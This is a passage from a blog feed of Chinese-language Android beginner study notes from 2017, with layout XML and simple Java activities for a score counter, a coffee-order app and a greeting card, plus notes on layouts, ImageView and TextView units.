        <content type="html"><![CDATA[<p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373904.68026852776.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>activity_main.xml</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:id=&quot;@+id/activity_main&quot;    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot;    android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot;    android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot;    android:paddingTop=&quot;@dimen/activity_vertical_margin&quot;    tools:context=&quot;com.example.android.courtcounter.MainActivity&quot;&gt;    &lt;RelativeLayout        android:id=&quot;@+id/team_a_view&quot;        android:layout_width=&quot;170dp&quot;        android:layout_height=&quot;300dp&quot;        &gt;        &lt;TextView            android:id=&quot;@+id/team_a&quot;            android:text=&quot;Team A&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_centerHorizontal=&quot;true&quot;            android:textSize=&quot;14sp&quot;            android:textColor=&quot;#616161&quot;            android:fontFamily=&quot;sans-serif-medium&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/scoreA_text_view&quot;            android:text=&quot;0&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_below=&quot;@+id/team_a&quot;            android:layout_marginTop=&quot;16dp&quot;            android:layout_marginBottom=&quot;16dp&quot;            android:layout_centerHorizontal=&quot;true&quot;            android:textSize=&quot;56sp&quot;            android:textColor=&quot;#000000&quot;            android:fontFamily=&quot;sans-serif-light&quot;/&gt;        &lt;Button            android:id=&quot;@+id/point_3&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_marginLeft=&quot;24dp&quot;            android:layout_marginRight=&quot;24dp&quot;            android:text=&quot;+3 point&quot;            android:layout_below=&quot;@+id/scoreA_text_view&quot;            android:onClick=&quot;addThreeTeamA&quot;/&gt;        &lt;Button            android:id=&quot;@+id/point_2&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_marginLeft=&quot;24dp&quot;            android:layout_marginRight=&quot;24dp&quot;            android:layout_marginTop=&quot;16dp&quot;            android:layout_marginBottom=&quot;16dp&quot;            android:text=&quot;+2 point&quot;            android:layout_below=&quot;@+id/point_3&quot;            android:onClick=&quot;addTwoTeamA&quot;/&gt;        &lt;Button            android:id=&quot;@+id/free_point&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_marginLeft=&quot;24dp&quot;            android:layout_marginRight=&quot;24dp&quot;            android:text=&quot;free point&quot;            android:layout_below=&quot;@+id/point_2&quot;            android:onClick=&quot;addOneTeamA&quot;/&gt;    &lt;/RelativeLayout&gt;    &lt;RelativeLayout        android:id=&quot;@+id/line&quot;        android:layout_width=&quot;1dp&quot;        android:layout_height=&quot;300dp&quot;        android:layout_toRightOf=&quot;@+id/team_a_view&quot;        android:background=&quot;@android:color/darker_gray&quot;&gt;    &lt;/RelativeLayout&gt;    &lt;RelativeLayout        android:id=&quot;@+id/team_b_view&quot;        android:layout_width=&quot;170dp&quot;        android:layout_height=&quot;300dp&quot;        android:layout_toRightOf=&quot;@+id/line&quot;&gt;        &lt;TextView            android:id=&quot;@+id/team_b&quot;            android:text=&quot;Team B&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_centerHorizontal=&quot;true&quot;            android:textSize=&quot;14sp&quot;            android:textColor=&quot;#616161&quot;            android:fontFamily=&quot;sans-serif-medium&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/scoreB_text_view&quot;            android:text=&quot;0&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_marginTop=&quot;16dp&quot;            android:layout_marginBottom=&quot;16dp&quot;            android:layout_below=&quot;@+id/team_b&quot;            android:layout_centerHorizontal=&quot;true&quot;            android:textSize=&quot;56sp&quot;            android:textColor=&quot;#000000&quot;            android:fontFamily=&quot;sans-serif-light&quot;/&gt;        &lt;Button        android:id=&quot;@+id/pointB_3&quot;        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_marginLeft=&quot;24dp&quot;        android:layout_marginRight=&quot;24dp&quot;        android:text=&quot;+3 point&quot;        android:layout_below=&quot;@+id/scoreB_text_view&quot;        android:onClick=&quot;addThreeTeamB&quot;/&gt;        &lt;Button            android:id=&quot;@+id/pointB_2&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_marginLeft=&quot;24dp&quot;            android:layout_marginRight=&quot;24dp&quot;            android:layout_marginTop=&quot;16dp&quot;            android:layout_marginBottom=&quot;16dp&quot;            android:text=&quot;+2 point&quot;            android:layout_below=&quot;@+id/pointB_3&quot;            android:onClick=&quot;addTwoTeamB&quot;/&gt;        &lt;Button            android:id=&quot;@+id/free_pointB&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_marginLeft=&quot;24dp&quot;            android:layout_marginRight=&quot;24dp&quot;            android:text=&quot;FREE POINT&quot;            android:layout_below=&quot;@+id/pointB_2&quot;            android:onClick=&quot;addOneTeamB&quot;/&gt;    &lt;/RelativeLayout&gt;    &lt;Button        android:text=&quot;RESET&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_alignParentBottom=&quot;true&quot;        android:layout_centerHorizontal=&quot;true&quot;        android:onClick=&quot;reset&quot;        android:layout_marginBottom=&quot;8dp&quot;/&gt;&lt;/RelativeLayout&gt;</code></pre><p>mainactivity.java</p><pre><code>package com.example.android.courtcounter;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.TextView;public class MainActivity extends AppCompatActivity {    int scoreOfTeamA = 0;    int scoreOfTeamB = 0;    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);    }    public void addOneTeamA(View view){        scoreOfTeamA += 1;        displayForTeamA(scoreOfTeamA);    }    public void addTwoTeamA(View view){        scoreOfTeamA += 2;        displayForTeamA(scoreOfTeamA);    }    public void addThreeTeamA(View view){        scoreOfTeamA += 3;        displayForTeamA(scoreOfTeamA);    }    public void displayForTeamA(int number){        TextView totalScoreTextView = (TextView) findViewById(R.id.scoreA_text_view);        totalScoreTextView.setText(number +&quot;&quot;);    }    public void addOneTeamB(View view){        scoreOfTeamB += 1;        displayForTeamB(scoreOfTeamB);    }    public void addTwoTeamB(View view){        scoreOfTeamB += 2;        displayForTeamB(scoreOfTeamB);    }    public void addThreeTeamB(View view){        scoreOfTeamB += 3;        displayForTeamB(scoreOfTeamB);    }    public void displayForTeamB(int number){        TextView totalScoreTextView = (TextView) findViewById(R.id.scoreB_text_view);        totalScoreTextView.setText(number +&quot;&quot;);    }    public void reset(View v){        scoreOfTeamA = 0;        scoreOfTeamB = 0;        displayForTeamA(0);        displayForTeamB(0);    }}</code></pre><p>styles.xml</p><pre><code>&lt;resources&gt;    &lt;!-- Base application theme. --&gt;    &lt;style name=&quot;AppTheme&quot; parent=&quot;Theme.AppCompat.Light.DarkActionBar&quot;&gt;        &lt;!-- Primary theme color of the app (sets background color of app bar) --&gt;        &lt;item name=&quot;colorPrimary&quot;&gt;#FF9800&lt;/item&gt;        &lt;!-- Background color of buttons in the app --&gt;        &lt;item name=&quot;colorButtonNormal&quot;&gt;#FF9800&lt;/item&gt;    &lt;/style&gt;&lt;/resources&gt;</code></pre><p><strong>ÈáçÁÇπÂÜÖÂÆπ</strong></p><ol><li>Â∞±ÊòØ‰∏≠Èó¥ÁöÑÈÇ£‰∏™Ê∞¥Âπ≥Á∫øÔºåÂÖ∂ÂÆûÊòØ‰∏Ä‰∏™viewÔºåÂè™ÊòØwidth = ‚Äú1dp‚ÄùÔºåheightÂíåÂà´ÁöÑ‰∏ÄÊ†∑ </li><li>ÂΩìÁÑ∂Ôºå3‰∏™viewÊòØÂµåÂ•óÁöÑÔºåÊòØÂπ∂ÂàóÂÖ≥Á≥ª<br>3.Â¶ÇÊûúÊÑüËßâËá™Â∑±ÂÜôÁöÑÊ≤°ÈóÆÈ¢òÔºåÂèØ‰ª•‰∏ÄÁõ¥Êä•ÈîôÔºåËØ¥Êâæ‰∏çÂà∞Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Â∞ùËØïÔºåÂ∞ÜappÂà†‰∫ÜÔºåÈáçÊñ∞Ë£ÖÔºåÂÜçÊµãËØï</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>justJavaÂ∞èÂûãapp</title>
      <link href="/2017/09/09/justJava%E5%B0%8F%E5%9E%8Bapp/"/>
      <url>/2017/09/09/justJava%E5%B0%8F%E5%9E%8Bapp/</url>
      
        <content type="html"><![CDATA[<p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373905.5674337093.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>activity_main.xml</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:id=&quot;@+id/activity_main&quot;    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot;    android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot;    android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot;    android:paddingTop=&quot;@dimen/activity_vertical_margin&quot;    android:orientation=&quot;vertical&quot;    tools:context=&quot;com.husky.justjava.MainActivity&quot;&gt;    &lt;TextView        android:id=&quot;@+id/quantity&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:text=&quot;QUANTITY!&quot;        android:textColor=&quot;@android:color/darker_gray&quot;        android:textSize=&quot;25sp&quot;        android:layout_marginBottom=&quot;16dp&quot; /&gt;    &lt;RelativeLayout        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;&gt;        &lt;Button            android:id=&quot;@+id/decrease&quot;            android:text=&quot;+&quot;            android:layout_width=&quot;48dp&quot;            android:layout_height=&quot;48dp&quot;            android:layout_alignParentLeft=&quot;true&quot;            android:onClick=&quot;increment&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/quantity_text_view&quot;            android:text=&quot;0&quot;            android:padding=&quot;10dp&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_toRightOf=&quot;@+id/decrease&quot;            android:textSize=&quot;25sp&quot;/&gt;        &lt;Button            android:id=&quot;@+id/plus&quot;            android:text=&quot;-&quot;            android:layout_toRightOf=&quot;@+id/quantity_text_view&quot;            android:layout_width=&quot;48dp&quot;            android:layout_height=&quot;48dp&quot;            android:onClick=&quot;decrement&quot;/&gt;    &lt;/RelativeLayout&gt;    &lt;TextView        android:id=&quot;@+id/price&quot;        android:text=&quot;PRICE&quot;        android:layout_marginTop=&quot;16dp&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:textSize=&quot;25sp&quot; /&gt;    &lt;TextView        android:id=&quot;@+id/price_text_view&quot;        android:text=&quot;$0&quot;        android:layout_marginTop=&quot;16dp&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:textSize=&quot;25sp&quot;/&gt;    &lt;Button        android:id=&quot;@+id/button&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_marginTop=&quot;16dp&quot;        android:text=&quot;ORDER&quot;        android:onClick=&quot;submitOrder&quot;/&gt;&lt;/LinearLayout&gt;</code></pre><p>MainActivity.java</p><pre><code>package com.husky.justjava;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.TextView;import java.text.NumberFormat;/** * This app displays an order form to order coffee. */public class MainActivity extends AppCompatActivity {    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);    }    /**     * This method is called when the order button is clicked.     */    public void submitOrder(View view) {       TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view);       int numberOfCoffee = Integer.parseInt(quantityTextView.getText().toString());//        display(numberOfCoffee);//        displayPrice(numberOfCoffee * 5);        String priceMessage = &quot;$ &quot;+(numberOfCoffee*5)+&quot;\n&quot;+&quot;Thank you!&quot;;        displayMessage(priceMessage);    }    public void increment(View view){        TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view);        int quantity = Integer.parseInt(quantityTextView.getText().toString())+1;        display(quantity);    }    public void decrement(View view){        TextView quantityTextView = (TextView)findViewById(R.id.quantity_text_view);        int quantity = Integer.parseInt(quantityTextView.getText().toString())-1;        display(quantity);    }    /**     * This method displays the given quantity value on the screen.     */    private void display(int number) {        TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view);        quantityTextView.setText(&quot;&quot; + number);    }    private void displayPrice(int number){        TextView priceTextView= (TextView) findViewById(R.id.price_text_view);        priceTextView.setText(NumberFormat.getCurrencyInstance().format(number));    }    /**     * This method displays the given text on the screen.     */    private void displayMessage(String message) {        TextView priceTextView = (TextView) findViewById(R.id.price_text_view);        priceTextView.setText(message);    }}</code></pre><p><strong>ÈáçÁÇπÂÜÖÂÆπ</strong></p><ol><li><p>Nested ViewGroupsÂµåÂ•óÁöÑËßÜÂõæÁªÑ<br>ÂèØ‰ª•Âú®LinearLayout‰∏≠ÂµåÂ•óRelativeLayout<br>2.ÊåâÈíÆÁöÑonClickÊñπÊ≥ïandroid:onClick=‚ÄùsubmitOrder‚ÄùÔºåÂΩìÁÑ∂Âú®MainActivity.java‰∏≠Ë¶ÅÂÜôËøô‰∏™ÊñπÊ≥ïÔºåpublic<br>void submitOrder(View view){}</p></li><li><p>TextView quantityTextView = (TextView)findViewById(R.id.quantity_text_view);<br>int quantity = Integer.parseInt(quantityTextView.getText().toString())-1;</p></li><li><p>quantityTextView.setText(‚Äú‚Äù + number);Ëøô‰∏™ÂæàÈáçË¶ÅÔºånumberÊòØintÁ±ªÂûãÔºåÂøÖÈ°ªË¶ÅËΩ¨ÂûãÔºå‰∏çÁÑ∂‰ºö‰∏ÄÁõ¥Êä•ÈîôÔºå‚Äù‚Äù + numberÔºåÊàñËÄÖscoreView.setText(String.valueOf(score)); </p></li><li><p>priceTextView.setText(NumberFormat.getCurrencyInstance().format(number));Âè™ÊòØÂ∞ÜÊï∞Â≠óÂâçÈù¢ËΩ¨ÂûãÊàêÂ≠óÁ¨¶ÔºåË≠¨Â¶Ç10Êï∞Â≠óÔºåËΩ¨ÂûãÊàêÔø•10 </p></li><li><p>6. </p></li></ol><hr><p>È¢òÂ§ñËØùÔºåÂ¶ÇÊûúË¶ÅÂ≠¶‰π†androidÔºåÂæàÊé®Ëçê <a href="https://cn.udacity.com/" target="_blank" rel="noopener"> https://cn.udacity.com/ </a><br>‰ºòËææÂ≠¶Âüé</p>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ë¥∫Âç°Â∫îÁî®</title>
      <link href="/2017/09/08/%E8%B4%BA%E5%8D%A1%E5%BA%94%E7%94%A8/"/>
      <url>/2017/09/08/%E8%B4%BA%E5%8D%A1%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:id=&quot;@+id/activity_main&quot;    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    tools:context=&quot;com.husky.happybirthday.MainActivity&quot;&gt;    &lt;ImageView        android:src=&quot;@drawable/party&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:scaleType=&quot;centerCrop&quot;/&gt;    &lt;TextView        android:text=&quot;Happy Birthday,Ben!&quot;        android:fontFamily=&quot;sans-serif-light&quot;        android:textColor=&quot;@android:color/white&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_alignParentLeft=&quot;true&quot;        android:layout_alignParentTop=&quot;true&quot;        android:paddingLeft=&quot;20dp&quot;        android:paddingTop=&quot;20dp&quot;        android:textSize=&quot;30sp&quot;        /&gt;    &lt;TextView        android:text=&quot;From Adios&quot;        android:fontFamily=&quot;sans-serif-light&quot;        android:textColor=&quot;@android:color/white&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_alignParentBottom=&quot;true&quot;        android:layout_alignParentRight=&quot;true&quot;        android:paddingRight=&quot;20dp&quot;        android:paddingBottom=&quot;20dp&quot;        android:textSize=&quot;30sp&quot;        /&gt;&lt;/RelativeLayout&gt;</code></pre><p>ÊïàÊûú <img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373906.30744155186.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"></p><ol><li>ÂÆö‰ΩçÔºåÈ¶ñÂÖàTextView‰∏≠Ôºå‰ΩøÁî®android:layout_alignParentRight </li><li>ÂÖàÂêéÈ°∫Â∫èÔºåÂ∫îËØ•ÊòØImageViewÔºåTextView,TextView.ËøôÊ†∑ÂèØ‰ª•‰∏ç‰ºöÂ∞ÜÊñáÂ≠óË¶ÜÁõñÊéâ </li><li>padding </li><li>android:scaleType=‚ÄùcenterCrop‚Äù<br>(1)ÂΩìÂõæÁâáÂ§ß‰∫éImageViewÁöÑÂÆΩÈ´òÔºö‰ª•ÂõæÁâáÁöÑ‰∏≠ÂøÉÁÇπÂíåImageViewÁöÑ‰∏≠ÂøÉÁÇπ‰∏∫Âü∫ÂáÜÔºåÊåâÊØî‰æãÁº©Â∞èÂõæÁâáÔºåÁõ¥Âà∞ÂõæÁâáÁöÑÂÆΩÈ´òÊúâ‰∏ÄËæπÁ≠â‰∫éImageViewÁöÑÂÆΩÈ´òÔºåÂàôÂØπ‰∫éÂè¶‰∏ÄËæπÔºåÂõæÁâáÁöÑÈïøÂ∫¶Â§ß‰∫éÊàñÁ≠â‰∫éImageViewÁöÑÈïøÂ∫¶ÔºåÊúÄÂêéÁî®ImageViewÁöÑÂ§ßÂ∞èÂ±Ö‰∏≠Êà™ÂèñËØ•ÂõæÁâá„ÄÇ<br>(2)ÂΩìÂõæÁâáÂ∞è‰∫éImageViewÁöÑÂÆΩÈ´òÔºö‰ª•ÂõæÁâáÁöÑ‰∏≠ÂøÉÂ∫óÂíåImageViewÁöÑ‰∏≠ÂøÉÁÇπ‰∏∫Âü∫ÂáÜÔºåÊåâÊØî‰æãÊâ©Â§ßÂõæÁâáÔºåÁõ¥Âà∞ÂõæÁâáÁöÑÂÆΩÈ´òÂ§ß‰∫éÊàñÁ≠â‰∫éImageViewÁöÑÂÆΩÈ´òÔºåÂπ∂ÊåâImageViewÁöÑÂ§ßÂ∞èÂ±Ö‰∏≠Êà™ÂèñËØ•ÂõæÁâá„ÄÇ</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂÜÖËæπË∑ùÂíåÂ§ñËæπË∑ù</title>
      <link href="/2017/09/07/%E5%86%85%E8%BE%B9%E8%B7%9D%E5%92%8C%E5%A4%96%E8%BE%B9%E8%B7%9D/"/>
      <url>/2017/09/07/%E5%86%85%E8%BE%B9%E8%B7%9D%E5%92%8C%E5%A4%96%E8%BE%B9%E8%B7%9D/</url>
      
        <content type="html"><![CDATA[<p>ÂÖ∑‰ΩìÁî®Ê≥ï<br>padding</p><pre><code>android:paddingLeft=&quot;16dp&quot;android:paddingRight=&quot;16dp&quot;ËøòÊúâandroid:padding=&quot;16dp&quot;</code></pre><p>margin</p><pre><code>android:layout_margin=&quot;16dp&quot;ÊàñËÄÖandroid:layout_marginBottom=&quot;16dp&quot;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RelativeLayout</title>
      <link href="/2017/09/07/RelativeLayout/"/>
      <url>/2017/09/07/RelativeLayout/</url>
      
        <content type="html"><![CDATA[<p>Âü∫‰∫éÁà∂ËßÜÂõæ</p><pre><code>android:layout_alignParentTopIf &quot;true&quot;, makes the top edge of this view match the top edge of the parent.ËøôÊòØÂ±Ö‰∫éÈ°∂ÈÉ®ÔºåÂ¶ÇÊûúÊòØÂ∑¶‰∏äÁöÑËØùÔºåandroidÔºölayout_alignParentTop=&quot;true&quot;android:layout_alignParentLeft=&quot;true&quot;ÂÖ∂‰ªñÁöÑ‰∏çÂÜôÔºåÈªòËÆ§ÊòØfalseandroid:layout_centerVerticalIf &quot;true&quot;, centers this child vertically within its parent.</code></pre><p>Âü∫‰∫éÂÖ∂‰ªñËßÜÂõæ</p><pre><code>android:layout_belowPositions the top edge of this view below the view specified with a resource ID.android:layout_toRightOfPositions the left edge of this view to the right of the view specified with a resource ID.</code></pre><p>ÂÖ∑‰ΩìÂú® <a href="https://developer.android.com/reference/android/widget/RelativeLayout.LayoutParams.html" target="_blank" rel="noopener"><br>https://developer.android.com/reference/android/widget/RelativeLayout.LayoutParams.html</a><br>Â¶ÇÊûúidÊòØ@+id/photo<br>Âú®‰∏ãÈù¢ÂºïÁî®Êó∂ÔºåÊòØandroid:layout_toRightOf=‚Äù@id/photo‚Äù</p>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinearLayout</title>
      <link href="/2017/09/06/LinearLayout/"/>
      <url>/2017/09/06/LinearLayout/</url>
      
        <content type="html"><![CDATA[<p>LinearLayout:Ê∞¥Âπ≥Â∏ÉÂ±Ä<br>1.android:orientation</p><p>Should the layout be a column or a row? Use ‚Äúhorizontal‚Äù for a row, ‚Äúvertical‚Äù<br>for a column. The default is horizontal.<br>ÂûÇÁõ¥Â∏ÉÂ±ÄËøòÊòØÊ∞¥Âπ≥Â∏ÉÂ±Ä</p><p>2.Á≠âÈó¥Ë∑ùÂ∏ÉÂ±Ä<br>Ê∞¥Âπ≥Á≠âÈó¥Ë∑ù<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373909.2913419173.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÂàÜÂà´‰ªéÂ∑¶ÂæÄÂè≥<br>1.layout_width=‚Äù0dp‚Äùlayout_height=‚Äùmatch_parent‚Äùlayout_weight=‚Äù1‚Äù<br>2.layout_width=‚Äù0dp‚Äùlayout_height=‚Äùmatch_parent‚Äùlayout_weight=‚Äù2‚Äù<br>3.layout_width=‚Äù0dp‚Äùlayout_height=‚Äùmatch_parent‚Äùlayout_weight=‚Äù1‚Äù</p><p>È¶ñÂÖàÁ°ÆÂÆöÊòØÊ∞¥Âπ≥Á≠âË∑ùÁ¶ªËøòÊòØÂûÇÁõ¥Á≠âË∑ùÁ¶ªÔºåÁÑ∂ÂêéËÆæÁΩÆÂÆΩÊàñÈ´ò‰∏∫0dpÔºåÁÑ∂ÂêéËÆæÁΩÆlayout_weight.<br>layout_weightÂ¶ÇÊûú‰∏çËÆæÁΩÆÔºåÈªòËÆ§ÊòØ0ÔºåÊòØËøô‰∏™viewÁöÑÈªòËÆ§Â§ßÂ∞è</p>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImageView</title>
      <link href="/2017/09/06/ImageView/"/>
      <url>/2017/09/06/ImageView/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;ImageView        android:src=&quot;@drawable/gakki&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:scaleType=&quot;centerCrop&quot; /&gt;</code></pre><p>È¶ñÂÖàÂú®drawableÈáåÈù¢ÂØºÂÖ•ÂõæÁâáÔºågakki.jpg<br>ÁÑ∂ÂêéË∞ÉÁî®Êó∂android:src=‚Äù@drawable/gakki‚ÄùÔºå‰∏çÁî®Âä†ÂõæÁâáÁöÑÊãìÂ±ïÂêç<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373910.07054979943.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ËøôÂº†ÂõæËΩ¨ËΩΩÊù•Ëá™ <a href="http://blog.csdn.net/u012947056/article/details/46816153" target="_blank" rel="noopener"> http://blog.csdn.net/u012947056/article/details/46816153</a><br>‰ΩøÁî®scaleType=‚ÄùcenterCrop‚ÄùÊó∂ÔºåÊòØÊó†ËæπÊ°ÜÔºåÁªô‰∫∫Ë∫´‰∏¥ÂÖ∂Â¢ÉÁöÑÊÑüËßâ</p><p>google chromeÊêúÁ¥¢È°µÈù¢‰∏≠‰ø°ÊÅØÊó∂Ôºåwindows ctr+F<br>mac cmd+ F</p><pre><code> &lt;LinearLayout       xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;       android:layout_width=&quot;match_parent&quot;       android:layout_height=&quot;match_parent&quot;&gt;    &lt;TextView        android:id=&quot;@+id/text_view_id&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_width=&quot;wrap_content&quot;        android:text=&quot;@string/hello&quot; /&gt; &lt;/LinearLayout&gt;  public class MainActivity extends Activity {    protected void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.activity_main);         final TextView helloTextView = (TextView) findViewById(R.id.text_view_id);         helloTextView.setText(R.string.user_greeting);     }This code sample demonstrates how to modify the contents of the text view defined in the previous XML layout:</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android_TextView</title>
      <link href="/2017/09/06/android_TextView/"/>
      <url>/2017/09/06/android_TextView/</url>
      
        <content type="html"><![CDATA[<p>XML:ÂèØÊãìÂ±ïÊ†áËÆ∞ËØ≠Ë®Ä<br>px ÔºöÊòØÂ±èÂπïÁöÑÂÉèÁ¥†ÁÇπ<br>dp Ôºö‰∏Ä‰∏™Âü∫‰∫édensityÁöÑÊäΩË±°Âçï‰ΩçÔºåÂ¶ÇÊûú‰∏Ä‰∏™160dpiÁöÑÂ±èÂπïÔºå1dp=1px<br>dip ÔºöÁ≠âÂêå‰∫édp<br>sp ÔºöÂêådpÁõ∏‰ººÔºå‰ΩÜËøò‰ºöÊ†πÊçÆÁî®Êà∑ÁöÑÂ≠ó‰ΩìÂ§ßÂ∞èÂÅèÂ•ΩÊù•Áº©Êîæ(Âª∫ËÆÆ‰ΩøÁî®sp‰Ωú‰∏∫ÊñáÊú¨ÁöÑÂçï‰ΩçÔºåÂÖ∂ÂÆÉÁî®dip)</p><pre><code>&lt;TextView    &lt;/&gt;or&lt;TextView &gt;&lt;/TextView&gt;</code></pre><p>sp<br>android:textSize=‚Äù56sp‚Äù<br>ÊàñËÄÖÈááÁî®androidÔºötextAppearance=‚Äù?android:textAppearanceLarge‚Äù</p><p>ËøòÊúâandroidÁöÑÈ¢úËâ≤Ë°® <a href="https://material.io/guidelines/style/color.html#color-color-system" target="_blank" rel="noopener"> https://material.io/guidelines/style/color.html#color-color-<br>system </a></p>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
            <tag> androidÊó•Âøó </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonÂÜôÂÖ•mysql‰π±Á†Å</title>
      <link href="/2017/06/07/python%E5%86%99%E5%85%A5mysql%E4%B9%B1%E7%A0%81/"/>
      <url>/2017/06/07/python%E5%86%99%E5%85%A5mysql%E4%B9%B1%E7%A0%81/</url>
      
